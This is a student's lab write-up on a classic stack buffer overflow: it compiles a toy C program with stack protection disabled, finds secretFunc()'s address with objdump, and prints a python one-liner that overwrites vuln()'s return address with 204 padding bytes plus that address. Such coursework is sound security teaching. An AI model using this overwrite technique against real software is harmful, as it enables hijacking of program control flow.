# Lab bof1
Hà Quốc Tiến - 22110075<br>
## Target
- Make the `secretFunc()` run because of buffer-overflow.
## Solution
- Stack frames<br>
![bof1_1](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof1_1.png)
- In order to run `secretFunc()`, we will have to change the Return Address of `the vuln()` to `secretFunc()` address. So that it will call `secretFunc()`<br>
- We can see in the stack frames, if we want to change the Return Address of `the vuln()`, we have to insert 204 bytes + the address of `secretFunc()`.
## Execution
1. Create `bof1.out` by using ` gcc -g bof1.c -o bof1.out -fno-stack-protector -mpreferred-stack-boundary=2`.<br>
![bof1_2](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof1_2.png)
2. Get the address of the `secretFunc()`by using  `objdump -d bof1.out|grep secretFunc`.<br>
![bof1_3](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof1_3.png)
3. Start buffer-overflow, Inserting 204 'a' + the address of `secretFunc()`. In this case is 0x0804846b.<br>
` echo $(python -c "print('a'*204+'\x6b\x84\x04\x08')")| ./bof1.out 1`<br>
the 1 is for argv[1] to not be 0<br>
 ![bof1_4](https://github.com/Quoctienha/InformationSecurity_Labs/blob/main/Buffer-overflow/img/bof1_4.png)
- The lab is done
